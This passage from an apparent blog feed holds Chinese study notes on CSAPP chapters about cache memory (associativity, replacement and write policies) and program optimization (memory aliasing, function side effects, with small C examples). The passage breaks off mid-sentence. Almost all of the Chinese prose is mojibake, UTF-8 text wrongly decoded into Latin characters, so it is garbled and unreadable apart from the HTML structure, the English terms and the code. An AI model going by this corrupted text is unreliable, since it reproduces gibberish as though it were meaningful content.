æ­¤æˆ‘ä»¬å¯ä»¥æŠŠç»„ç›¸è”é«˜é€Ÿç¼“å­˜ä¸­çš„æ¯ä¸ªç»„éƒ½çœ‹æˆä¸€ä¸ªå°çš„ç›¸è”å­˜å‚¨å™¨ï¼Œkey æ˜¯æ ‡è®°å’Œæœ‰æ•ˆä½ï¼Œè€Œ value å°±æ˜¯å—çš„å†…å®¹ã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/6-%E7%BB%84%E7%9B%B8%E8%81%94%E8%A1%8C%E5%8C%B9%E9%85%8D.png"></p><h4 id="ä¸å‘½ä¸­æ—¶çš„è¡Œæ›¿æ¢-1"><a href="#ä¸å‘½ä¸­æ—¶çš„è¡Œæ›¿æ¢-1" class="headerlink" title="ä¸å‘½ä¸­æ—¶çš„è¡Œæ›¿æ¢"></a>ä¸å‘½ä¸­æ—¶çš„è¡Œæ›¿æ¢</h4><p>å› ä¸ºç»„ç›¸è”é«˜é€Ÿç¼“å­˜ä¸­ä¸€ç»„æœ‰å¾ˆå¤šè¡Œï¼Œæˆ‘ä»¬å°±éœ€è¦ç”¨ä¸€å®šçš„æ›¿æ¢ç­–ç•¥æ¥å†³å®šæ›¿æ¢çš„è¡Œï¼š</p><p>æœ€ç®€å•çš„æ›¿æ¢ç­–ç•¥å°±æ˜¯éšæœºé€‰æ‹©ä¸€è¡Œï¼Œå…¶ä»–æ›´å¤æ‚çš„ç­–ç•¥åˆ©ç”¨äº†å±€éƒ¨æ€§åŸç†ï¼Œä»¥ä½¿åœ¨æ¯”è¾ƒè¿‘çš„å°†æ¥å¼•ç”¨è¢«æ›¿æ¢çš„è¡Œçš„æ¦‚ç‡æœ€å°ã€‚</p><ul><li><strong>æœ€ä¸å¸¸ä½¿ç”¨</strong>ï¼ˆLeast-Frequently-Usedï¼ŒLFUï¼‰ç­–ç•¥ï¼šä¼šæ›¿æ¢åœ¨è¿‡å»æŸä¸ªæ—¶é—´çª—å£å†…å¼•ç”¨æ¬¡æ•°æœ€å°‘çš„é‚£ä¸€è¡Œï¼ˆé€‚ç”¨äºç©ºé—´å±€éƒ¨æ€§è¾ƒé«˜çš„ç¨‹åºï¼‰ã€‚</li><li><strong>æœ€è¿‘æœ€å°‘ä½¿ç”¨</strong>ï¼ˆLeast-Recently-Usedï¼ŒLRUï¼‰ç­–ç•¥ï¼šä¼šæ›¿æ¢æœ€åä¸€æ¬¡è®¿é—®æ—¶é—´æœ€ä¹…è¿œçš„é‚£ä¸€è¡Œï¼ˆé€‚ç”¨äºæ—¶é—´å±€éƒ¨æ€§è¾ƒé«˜çš„ç¨‹åºï¼‰ã€‚</li></ul><p>æ‰€æœ‰è¿™äº›ç­–ç•¥éƒ½éœ€è¦é¢å¤–çš„æ—¶é—´å’Œç¡¬ä»¶ã€‚ä½†æ˜¯ï¼Œè¶Šå¾€å­˜å‚¨å™¨ä½“ç³»ç»“æ„ä¸‹é¢èµ°ï¼Œè¿œç¦»CPUï¼Œä¸€æ¬¡ä¸å‘½ä¸­çš„å¼€é”€å°±ä¼šæ›´åŠ æ˜‚è´µï¼Œç”¨æ›´å¥½çš„æ›¿æ¢ç­–ç•¥ä½¿å¾—ä¸å‘½ä¸­æœ€å°‘ä¹Ÿå˜å¾—æ›´åŠ å€¼å¾—äº†ã€‚</p><h3 id="å…¨ç›¸è”é«˜é€Ÿç¼“å­˜"><a href="#å…¨ç›¸è”é«˜é€Ÿç¼“å­˜" class="headerlink" title="å…¨ç›¸è”é«˜é€Ÿç¼“å­˜"></a>å…¨ç›¸è”é«˜é€Ÿç¼“å­˜</h3><p>å…¨ç›¸è”é«˜é€Ÿç¼“å­˜æ˜¯æœ‰ä¸€ä¸ªåŒ…å«æ‰€æœ‰é«˜é€Ÿç¼“å­˜è¡Œçš„ç»„ï¼ˆä¹Ÿå°±æ˜¯ E&#x3D;C&#x2F;Bï¼‰ç»„æˆçš„ã€‚å¦‚ä¸‹ï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/6-%E5%85%A8%E7%9B%B8%E8%81%94%E9%AB%98%E9%80%9F%E7%BC%93%E5%AD%98.png"></p><h4 id="ç»„é€‰æ‹©-2"><a href="#ç»„é€‰æ‹©-2" class="headerlink" title="ç»„é€‰æ‹©"></a>ç»„é€‰æ‹©</h4><p>å› ä¸ºå…¨ç›¸è”é«˜é€Ÿç¼“å­˜åªæœ‰ä¸€ä¸ªç»„ï¼Œæ‰€ä»¥å¯¹åº”çš„åœ°å€ä¸­æ˜¯æ²¡æœ‰ç»„ç´¢å¼•ä½çš„ï¼Œæˆ‘ä»¬é»˜è®¤å°±æ˜¯ç»„ 0 ã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/6-%E5%85%A8%E7%9B%B8%E8%81%94%E8%A1%8C%E5%8C%B9%E9%85%8D.png"></p><h4 id="è¡ŒåŒ¹é…å’Œå­—é€‰æ‹©-1"><a href="#è¡ŒåŒ¹é…å’Œå­—é€‰æ‹©-1" class="headerlink" title="è¡ŒåŒ¹é…å’Œå­—é€‰æ‹©"></a>è¡ŒåŒ¹é…å’Œå­—é€‰æ‹©</h4><p>å’Œå…¶ä»–çš„ä¸€æ ·ï¼‰</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/6-%E5%85%A8%E7%9B%B8%E8%81%94%E5%AD%97%E9%80%89%E6%8B%A9.png"></p><p>å› ä¸ºé«˜é€Ÿç¼“å­˜ç”µè·¯å¿…é¡»å¹¶è¡Œåœ°æœç´¢è®¸å¤šç›¸åŒ¹é…çš„æ ‡è®°ï¼Œæ„é€ ä¸€ä¸ªåˆå¤§åˆå¿«çš„ç›¸è”é«˜é€Ÿç¼“å­˜å¾ˆå›°éš¾ï¼Œè€Œä¸”å¾ˆæ˜‚è´µã€‚å› æ­¤ï¼Œå…¨ç›¸è”é«˜é€Ÿç¼“å­˜åªé€‚åˆåšå°çš„é«˜é€Ÿç¼“å­˜ã€‚</p><h3 id="æœ‰å…³å†™çš„é—®é¢˜"><a href="#æœ‰å…³å†™çš„é—®é¢˜" class="headerlink" title="æœ‰å…³å†™çš„é—®é¢˜"></a>æœ‰å…³å†™çš„é—®é¢˜</h3><p>å‰é¢æˆ‘ä»¬éƒ½åœ¨å­¦ä¹ è¯»çš„æ“ä½œï¼Œå†™çš„æƒ…å†µæ¯”è¯»è¦å¤æ‚çš„å¤šã€‚</p><p>å‡è®¾æˆ‘ä»¬è¦å†™ä¸€ä¸ªå·²ç»ç¼“å­˜äº†çš„å­— wï¼ˆå†™å‘½ä¸­ï¼Œwrite hitï¼‰ã€‚åœ¨é«˜é€Ÿç¼“å­˜æ›´æ–°äº†å®ƒçš„ w çš„å‰¯æœ¬ä¹‹åï¼Œæ€ä¹ˆæ›´æ–° w åœ¨å±‚æ¬¡ç»“æ„ä¸­ç´§æ¥ç€ä½ä¸€å±‚ä¸­çš„å‰¯æœ¬å‘¢ï¼Ÿ</p><ul><li><p><strong>ç›´å†™</strong>ï¼ˆwrite-throughï¼‰ï¼Œå°±æ˜¯ç«‹å³å°† w çš„é«˜é€Ÿç¼“å­˜å—å†™å›åˆ°ç´§æ¥ç€çš„ä½ä¸€å±‚ä¸­ã€‚</p><p>ç›´å†™çš„ç¼ºç‚¹æ˜¯æ¯æ¬¡å†™éƒ½ä¼šå¼•èµ·æ€»çº¿æµé‡ã€‚</p></li><li><p><strong>å†™å›</strong>ï¼ˆwrite-backï¼‰ï¼Œå°½å¯èƒ½åœ°æ¨è¿Ÿæ›´æ–°ï¼Œåªæœ‰å½“æ›¿æ¢ç®—æ³•è¦é©±é€è¿™ä¸ªæ›´æ–°è¿‡çš„å—æ—¶ï¼Œæ‰æŠŠå®ƒå†™åˆ°ç´§æ¥ç€çš„ä½ä¸€å±‚ä¸­ã€‚</p><p>ç”±äºå±€éƒ¨æ€§ï¼Œå†™å›èƒ½æ˜¾è‘—åœ°å‡å°‘æ€»çº¿æµé‡ï¼Œä½†æ˜¯å®ƒçš„ç¼ºç‚¹æ˜¯å¢åŠ äº†å¤æ‚æ€§ã€‚é«˜é€Ÿç¼“å­˜å¿…é¡»ä¸ºæ¯ä¸ªé«˜é€Ÿç¼“å­˜è¡Œç»´æŠ¤ä¸€ä¸ªé¢å¤–çš„ä¿®æ”¹ä½ï¼ˆdirty bitï¼‰ï¼Œè¡¨æ˜è¿™ä¸ªé«˜é€Ÿç¼“å­˜å—æ˜¯å¦è¢«ä¿®æ”¹è¿‡ã€‚</p></li></ul><p>å¯¹äºä¸å‘½ä¸­ä¹Ÿæœ‰ç›¸åº”çš„è§£å†³æ–¹æ¡ˆï¼š</p><ul><li><p><strong>å†™åˆ†é…</strong>ï¼ˆwrite-allocateï¼‰ï¼ŒåŠ è½½ç›¸åº”çš„ä½ä¸€å±‚ä¸­çš„å—åˆ°é«˜é€Ÿç¼“å­˜ä¸­ï¼Œç„¶åæ›´æ–°è¿™ä¸ªé«˜é€Ÿç¼“å­˜å—ã€‚</p><p>å†™åˆ†é…è¯•å›¾åˆ©ç”¨å†™çš„ç©ºé—´å±€éƒ¨æ€§ï¼Œä½†æ˜¯ç¼ºç‚¹æ˜¯æ¯æ¬¡ä¸å‘½ä¸­éƒ½ä¼šå¯¼è‡´ä¸€ä¸ªå—ä»ä½ä¸€å±‚ä¼ é€åˆ°é«˜é€Ÿç¼“å­˜ã€‚</p></li><li><p><strong>éå†™åˆ†é…</strong>ï¼ˆnot-write-allocateï¼‰ï¼Œé¿å¼€é«˜é€Ÿç¼“å­˜ï¼Œç›´æ¥æŠŠè¿™ä¸ªå­—å†™åˆ°ä½ä¸€å±‚ä¸­ã€‚</p></li></ul><p>ç›´å†™é«˜é€Ÿç¼“å­˜é€šå¸¸æ˜¯éå†™åˆ†é…çš„ï¼Œå†™å›é«˜é€Ÿç¼“å­˜é€šå¸¸æ˜¯å†™åˆ†é…çš„ã€‚</p><h3 id="å®é™…çš„é«˜é€Ÿç¼“å­˜"><a href="#å®é™…çš„é«˜é€Ÿç¼“å­˜" class="headerlink" title="å®é™…çš„é«˜é€Ÿç¼“å­˜"></a>å®é™…çš„é«˜é€Ÿç¼“å­˜</h3><p>æˆ‘ä»¬ä¸€ç›´å‡è®¾é«˜é€Ÿç¼“å­˜åªä¿å­˜æ•°æ®ï¼Œå®é™…ä¸Šé«˜é€Ÿç¼“å­˜åŠä¿å­˜æ•°æ®ï¼Œä¹Ÿä¿å­˜æŒ‡ä»¤ã€‚åªä¿å­˜æŒ‡ä»¤çš„é«˜é€Ÿç¼“å­˜ï¼Œç§°ä¸º <code>i-cache</code>ï¼Œè€Œåªä¿å­˜æ•°æ®çš„ç§°ä¸º <code>d-cache</code>ï¼Œæ—¢ä¿å­˜æ•°æ®åˆä¿å­˜æŒ‡ä»¤çš„é«˜é€Ÿç¼“å­˜å«ç»Ÿä¸€é«˜é€Ÿç¼“å­˜ <code>unified cache</code> ã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/6-%E5%AE%9E%E9%99%85%E7%9A%84%E9%AB%98%E9%80%9F%E7%BC%93%E5%AD%98.png"></p><h3 id="é«˜é€Ÿç¼“å­˜çš„æ€§èƒ½å½±å“"><a href="#é«˜é€Ÿç¼“å­˜çš„æ€§èƒ½å½±å“" class="headerlink" title="é«˜é€Ÿç¼“å­˜çš„æ€§èƒ½å½±å“"></a>é«˜é€Ÿç¼“å­˜çš„æ€§èƒ½å½±å“</h3><p>æœ‰è®¸å¤šæŒ‡æ ‡æ¥è¡¡é‡é«˜é€Ÿç¼“å­˜çš„æ€§èƒ½ï¼š</p><ul><li>ä¸å‘½ä¸­ç‡ï¼ˆmiss rateï¼‰ã€‚åœ¨ä¸€ä¸ªç¨‹åºæ‰§è¡Œæˆ–ç¨‹åºçš„ä¸€éƒ¨åˆ†æ‰§è¡ŒæœŸé—´ï¼Œå†…å­˜å¼•ç”¨ä¸å‘½ä¸­çš„æ¯”ç‡ã€‚å®ƒæ˜¯è¿™æ ·è®¡ç®—çš„ï¼š<code>ä¸å‘½ä¸­æ•°é‡/å¼•ç”¨æ•°é‡</code>ã€‚</li><li>å‘½ä¸­ç‡ï¼ˆhit rateï¼‰ã€‚å‘½ä¸­çš„å†…å­˜å¼•ç”¨æ¯”ç‡ã€‚å®ƒç­‰äº <code>1-ä¸å‘½ä¸­ç‡</code>ã€‚</li><li>å‘½ä¸­æ—¶é—´ï¼ˆhit timeï¼‰ã€‚ä»é«˜é€Ÿç¼“å­˜ä¼ é€ä¸€ä¸ªå­—åˆ°CPUæ‰€éœ€çš„æ—¶é—´ï¼ŒåŒ…æ‹¬ç»„é€‰æ‹©ã€è¡Œç¡®è®¤å’Œå­—é€‰æ‹©çš„æ—¶é—´ã€‚å¯¹äºL1é«˜é€Ÿç¼“å­˜æ¥è¯´ï¼Œå‘½ä¸­æ—¶é—´çš„æ•°é‡çº§æ˜¯å‡ ä¸ªæ—¶é’Ÿå‘¨æœŸã€‚</li><li>ä¸å‘½ä¸­å¤„ç½šï¼ˆmiss penaltyï¼‰ã€‚ç”±äºä¸å‘½ä¸­æ‰€éœ€è¦çš„é¢å¤–çš„æ—¶é—´ã€‚L1ä¸å‘½ä¸­éœ€è¦ä»L2å¾—åˆ°æœåŠ¡çš„å¤„ç½šï¼Œé€šå¸¸æ˜¯æ•°10ä¸ªå‘¨æœŸï¼›ä»L3å¾—åˆ°æœåŠ¡çš„å¤„ç½šï¼Œ50ä¸ªå‘¨æœŸï¼›ä»ä¸»å­˜å¾—åˆ°çš„æœåŠ¡çš„å¤„ç½šï¼Œ200ä¸ªå‘¨æœŸã€‚</li></ul><h4 id="é«˜é€Ÿç¼“å­˜å¤§å°çš„å½±å“"><a href="#é«˜é€Ÿç¼“å­˜å¤§å°çš„å½±å“" class="headerlink" title="é«˜é€Ÿç¼“å­˜å¤§å°çš„å½±å“"></a>é«˜é€Ÿç¼“å­˜å¤§å°çš„å½±å“</h4><p>ä¸€æ–¹é¢ï¼Œè¾ƒå¤§çš„é«˜é€Ÿç¼“å­˜å¯èƒ½ä¼šæé«˜å‘½ä¸­ç‡ã€‚å¦ä¸€æ–¹é¢ï¼Œä½¿å¤§å­˜å‚¨å™¨è¿è¡Œå¾—æ›´å¿«æ€»æ˜¯è¦éš¾ä¸€äº›çš„ã€‚è¾ƒå¤§çš„é«˜é€Ÿç¼“å­˜å¯èƒ½ä¼šå¢åŠ å‘½ä¸­æ—¶é—´ï¼Œæ‰€ä»¥æˆ‘ä»¬æ‰ä¼šæœ‰ L1ã€L2 ã€L3 çš„é«˜é€Ÿç¼“å­˜è‡ªå°åˆ°å¤§çš„é¡ºåºã€‚</p><h4 id="å—å¤§å°çš„å½±å“"><a href="#å—å¤§å°çš„å½±å“" class="headerlink" title="å—å¤§å°çš„å½±å“"></a>å—å¤§å°çš„å½±å“</h4><p>å¤§çš„å—æœ‰åˆ©æœ‰å¼Šï¼Œè¾ƒå¤§çš„å—èƒ½æ›´é«˜åœ°åˆ©ç”¨ç©ºé—´å±€éƒ¨æ€§ï¼Œå¸®åŠ©æé«˜å‘½ä¸­ç‡ã€‚ä½†æ˜¯å¯èƒ½å¯¹æ—¶é—´å±€éƒ¨æ€§åˆ©ç”¨ä¸è¶³ï¼Œå¢åŠ å‘½ä¸­æ—¶é—´ã€‚</p><h4 id="ç›¸è”åº¦çš„å½±å“"><a href="#ç›¸è”åº¦çš„å½±å“" class="headerlink" title="ç›¸è”åº¦çš„å½±å“"></a>ç›¸è”åº¦çš„å½±å“</h4><p>è¾ƒé«˜çš„ç›¸è”åº¦ï¼ˆä¹Ÿå°±æ˜¯Eçš„å€¼è¾ƒå¤§ï¼‰çš„ä¼˜ç‚¹æ˜¯é™ä½äº†é«˜é€Ÿç¼“å­˜ç”±äºå†²çªä¸å‘½ä¸­å‡ºç°æŠ–åŠ¨çš„å¯èƒ½æ€§ï¼Œä¸è¿‡è¾ƒé«˜çš„ç›¸è”åº¦ä¼šé€ æˆè¾ƒé«˜çš„æˆæœ¬ã€‚</p><h4 id="å†™ç­–ç•¥çš„å½±å“"><a href="#å†™ç­–ç•¥çš„å½±å“" class="headerlink" title="å†™ç­–ç•¥çš„å½±å“"></a>å†™ç­–ç•¥çš„å½±å“</h4><p>ä¸€èˆ¬æ¥è¯´ï¼Œé«˜é€Ÿç¼“å­˜è¶Šå¾€ä¸‹å±‚ï¼Œè¶Šæ˜¯é‡‡å–å†™å›çš„æ–¹å¼è€Œä¸æ˜¯ç›´æ¥å†™ã€‚</p><h1 id="ç¼–å†™é«˜é€Ÿç¼“å­˜å‹å¥½çš„ä»£ç "><a href="#ç¼–å†™é«˜é€Ÿç¼“å­˜å‹å¥½çš„ä»£ç " class="headerlink" title="ç¼–å†™é«˜é€Ÿç¼“å­˜å‹å¥½çš„ä»£ç "></a>ç¼–å†™é«˜é€Ÿç¼“å­˜å‹å¥½çš„ä»£ç </h1><ul><li><p>æ­¥é•¿ä¸º 1 çš„ä»£ç å¯ä»¥åœ¨å¾ªç¯ä½“å†…éƒ¨ï¼Œå°½é‡<strong>å‡å°‘ç¼“å­˜çš„ä¸å‘½ä¸­ç‡</strong>ã€‚</p></li><li><p><strong>å¯¹å±€éƒ¨å˜é‡åå¤å¼•ç”¨</strong>ï¼Œå› ä¸ºåå¤å¼•ç”¨çš„å±€éƒ¨å˜é‡ç¼–è¯‘å™¨ä¼šè€ƒè™‘æ”¾åœ¨å¯„å­˜å™¨å½“ä¸­ã€‚</p></li></ul><hr><p>æˆ‘é—ºé—ºçš„ä¸€ä¸ªæ¯”èµ›</p><p>å¥½ç©å¥½ç©ï¼Œå’Œå…»æˆæ¸¸æˆä¸€æ ·ï¼ï¼ğŸ¥³</p><p>ä»€ä¹ˆæ—¶å€™ CTF ä¹Ÿå¯ä»¥åšæˆè¿™ä¸ªæ ·å­</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/6-%E5%85%BB%E6%88%90%E6%B8%B8%E6%88%8F.png"></p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/6-%E5%85%BB%E6%88%90%E6%B8%B8%E6%88%8F2.png"></p><blockquote><p>æ€»ç»ç†åŠå…¬å®¤æ¯”å…¶ä»–æˆ¿é—´éƒ½å¤§ï¼Œæˆ‘é—ºé—ºæ˜¯ä¸‡æ¶çš„å¤§èµ„æœ¬å®¶ï¼</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>è¯»ä¹¦ç¬”è®°</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>CSAPP</tag>
      
      <tag>DRAM</tag>
      
      <tag>é«˜é€Ÿç¼“å­˜</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP ç¬¬äº”ç«  ä¼˜åŒ–ç¨‹åºæ€§èƒ½</title>
    <link href="/2023/11/19/CSAPP-%E7%AC%AC%E4%BA%94%E7%AB%A0-%E4%BC%98%E5%8C%96%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD/"/>
    <url>/2023/11/19/CSAPP-%E7%AC%AC%E4%BA%94%E7%AB%A0-%E4%BC%98%E5%8C%96%E7%A8%8B%E5%BA%8F%E6%80%A7%E8%83%BD/</url>
    
    <content type="html"><![CDATA[<p>ç¨‹åºçŒ¿ä¹Ÿé€‚ç”¨çš„ä¼˜åŒ–æ€§èƒ½å°æŠ€å·§</p><span id="more"></span><h1 id="ä¼˜åŒ–ç¼–è¯‘å™¨çš„èƒ½åŠ›å’Œå±€é™æ€§"><a href="#ä¼˜åŒ–ç¼–è¯‘å™¨çš„èƒ½åŠ›å’Œå±€é™æ€§" class="headerlink" title="ä¼˜åŒ–ç¼–è¯‘å™¨çš„èƒ½åŠ›å’Œå±€é™æ€§"></a>ä¼˜åŒ–ç¼–è¯‘å™¨çš„èƒ½åŠ›å’Œå±€é™æ€§</h1><p>å¤§å¤šæ•°çš„ç¼–è¯‘å™¨éƒ½å‘ç”¨æˆ·æä¾›äº†ä¸€äº›å¯¹ä»–ä»¬æ‰€ä½¿ç”¨çš„ä¼˜åŒ–çš„æ§åˆ¶ï¼Œæœ€ç®€å•çš„æ§åˆ¶å°±æ˜¯<strong>ä¼˜åŒ–çº§åˆ«</strong>ã€‚</p><p>ä¾‹å¦‚å‘½ä»¤è¡Œé€‰é¡¹ <code>&quot;-Og&quot;</code> è°ƒç”¨ GCC ä¼šè®©å®ƒä½¿ç”¨ä¸€ç»„åŸºæœ¬çš„ä¼˜åŒ–ï¼Œä»¥é€‰é¡¹ <code>&quot;-01&quot;</code> æˆ–æ›´é«˜è°ƒç”¨ GCC ä¼šè®©å®ƒä½¿ç”¨æ›´å¤§é‡çš„ä¼˜åŒ–ã€‚è¿™æ ·åšå¯ä»¥æé«˜ç¨‹åºçš„æ€§èƒ½ï¼Œä½†æ˜¯ä¹Ÿå¯èƒ½ä¼šå¢åŠ ç¨‹åºçš„è§„æ¨¡ã€‚</p><p>é™¤æ­¤ä¹‹å¤–æˆ‘ä»¬éœ€è¦æ³¨æ„<strong>ä¼˜åŒ–çš„å®‰å…¨æ€§</strong>ï¼Œä¹Ÿå°±æ˜¯è¯´ä¼˜åŒ–å‰åæˆåŠŸå†…éœ€ä¸èƒ½æœ‰ä»»ä½•ç¼–è¯‘è€…ç›®çš„ä¹‹å¤–çš„åŠŸèƒ½ã€‚</p><p>æˆ‘ä»¬æ¥çœ‹ä¸‹é¢çš„ä¸¤ä¸ªè¿‡ç¨‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">twiddle1</span><span class="hljs-params">(<span class="hljs-type">long</span> *xp,<span class="hljs-type">long</span> *yp)</span><br>&#123;<br>    *xp += *yp;<br>    *xp += *yp;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">twiddle2</span><span class="hljs-params">(<span class="hljs-type">long</span> *xp,<span class="hljs-type">long</span> *yp)</span><br>&#123;<br>    *xp += <span class="hljs-number">2</span>* *yp;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸Šé¢ä¸¤ä¸ªå‡½æ•°çš„åŠŸèƒ½éƒ½æ˜¯å°†å­˜å‚¨åœ¨æŒ‡é’ˆ yp ä½ç½®çš„å€¼ä¸¤æ¬¡åŠ åˆ° xp çŸ¥è¯†çš„ä½ç½®çš„å€¼ã€‚ä½†æ˜¯å‡½æ•° <code>twiddle2()</code> çš„æ•ˆç‡æ›´é«˜ï¼Œå®ƒåªè¦æ±‚æœ‰ä¸‰æ¬¡å¼•ç”¨ ï¼ˆè¯» *xpï¼Œè¯» *ypï¼Œå†™ *xpï¼‰ï¼Œè€Œ <code>twiddle1()</code> éœ€è¦æœ‰å…­æ¬¡å¼•ç”¨ï¼ˆä¸¤æ¬¡è¯» *xpï¼Œä¸¤æ¬¡è¯» *ypï¼Œä¸¤æ¬¡å†™ *xpï¼‰ã€‚</p><p>é‚£æˆ‘ä»¬è‡ªç„¶å°±ä¼šè®¤ä¸ºè¿™ä¸¤ä¸ªå‡½æ•°çš„åŠŸèƒ½ç›¸åŒä¸” <code>twiddle2()</code> æ›´é«˜æ•ˆï¼Œé»˜è®¤ç¼–è¯‘å™¨ä¼šæŒ‰ç…§ <code>twiddle2()</code> çš„æ–¹å¼æ¥ç¼–è¯‘  <code>twiddle1()</code> ï¼Œä½†å®é™…ä¸Šå¹¶éå¦‚æ­¤ã€‚</p><p>æˆ‘ä»¬å¿…é¡»è¦è€ƒè™‘åˆ° <code>*xp =*yp</code> ï¼Œå³ä¸¤ä¸ªæŒ‡é’ˆæŒ‡å‘åŒä¸€å¤„çš„æƒ…å†µæ¥è®²ï¼Œæ­¤æ—¶ä¸¤ä¸ªå‡½æ•°ä¼šåˆ†åˆ«è¿›è¡Œä¸‹é¢çš„è®¡ç®—ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">//twiddle1ï¼Œç»“æœæ˜¯*xpçš„å€¼å¢åŠ 4å€</span><br>*xp += *xp<br>*xp += *xp<br><span class="hljs-comment">//twiddle2ç»“æœæ˜¯*xpçš„å€¼å¢åŠ 3å€</span><br>    *xp += <span class="hljs-number">2</span>* *xp<br></code></pre></td></tr></table></figure><blockquote><p>ä¸¤ä¸ªæŒ‡é’ˆå¯èƒ½æŒ‡å‘åŒä¸€ä¸ªå†…å­˜ä½ç½®çš„æƒ…å†µæˆä¸ºå†…å­˜åˆ«åä½¿ç”¨</p></blockquote><p>å¯ä»¥çœ‹å‡ºè¿ç®—ç»“æœæ˜¯ä¸ç›¸åŒçš„ï¼Œè€Œç¼–è¯‘å™¨ä¹Ÿä¸çŸ¥é“è¿™ä¸ªå‡½æ•°å¦‚ä½•è¢«è°ƒç”¨ï¼Œæ‰€ä»¥å¿…é¡»è¦è€ƒè™‘åˆ°ä¸¤ä¸ªæŒ‡é’ˆæŒ‡å‘åŒä¸€å¤„å†…å­˜åœ°å€çš„æƒ…å†µï¼Œè¿™å°±æ˜¯ä¸€ä¸ªé™åˆ¶ä¼˜åŒ–çš„å› ç´ ã€‚</p><p>å†çœ‹å¦ä¸€ä¸ªä¾‹å­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">long</span> <span class="hljs-title function_">f</span><span class="hljs-params">()</span>;<br><br><span class="hljs-type">long</span> <span class="hljs-title function_">func1</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">return</span> f()+f()+f()+f();<br>&#125;<br><br><span class="hljs-type">long</span> <span class="hljs-title function_">func2</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">4</span>*f();<br>&#125;<br></code></pre></td></tr></table></figure><p>å’Œä¸Šé¢çš„ç¬¬ä¸€ä¸ªä¾‹å­ä¸€æ ·ï¼Œæˆ‘ä»¬ç¬¬ä¸€çœ¼ä¼šè§‰å¾—è¿™ä¸¤ä¸ªå‡½æ•°è®¡ç®—çš„æ˜¯ç›¸åŒçš„ç»“æœï¼Œå¹¶ä¸” <code>func2()</code> æ¯” <code>func1()</code> æ›´é«˜æ•ˆï¼Œè‡ªç„¶ä¼šè®¤ä¸ºç¼–è¯‘å™¨ä¼šå°† <code>func1()</code> æŒ‰ç…§ <code>func2()</code> çš„é£æ ¼ç¼–è¯‘ã€‚</p><p>ä½†æˆ‘ä»¬è¦è€ƒè™‘ä¸‹é¢çš„ f å‡½æ•°ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">long</span> counter=<span class="hljs-number">0</span>;<br><span class="hljs-type">long</span> <span class="hljs-title function_">f</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">return</span> counter++;<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬æ’é™¤å®ƒä¼šæ”¹å˜å…¨å±€ç¨‹åºçŠ¶æ€è¿™ä¸€è¡Œä¸ºï¼Œç‰¹åˆ«åœ°ï¼Œå¦‚æœå…¨å±€å˜é‡ counter è®¾ç½®ä¸º 0ï¼Œé‚£ä¹ˆ <code>func1()</code> ä¼šè¿”å›0+1+2+3&#x3D;6ï¼Œè€Œ <code>func2()</code> è¿”å› 4*0&#x3D;0ã€‚</p><p>è‡ªä¸Šå¯ä»¥çœ‹å‡ºï¼Œå‡½æ•°è°ƒç”¨ä¹Ÿæ˜¯å¦¨ç¢ä¼˜åŒ–çš„å› ç´ ä¹‹ä¸€ã€‚</p><h1 id="è¡¨ç¤ºç¨‹åºæ€§èƒ½"><a href="#è¡¨ç¤ºç¨‹åºæ€§èƒ½" class="headerlink" title="è¡¨ç¤ºç¨‹åºæ€§èƒ½"></a>è¡¨ç¤ºç¨‹åºæ€§èƒ½</h1><p>æˆ‘ä»¬é¦–å…ˆéœ€è¦å¼•å…¥åº¦é‡æ ‡å‡†â€”â€”<strong>æ¯å…ƒç´ 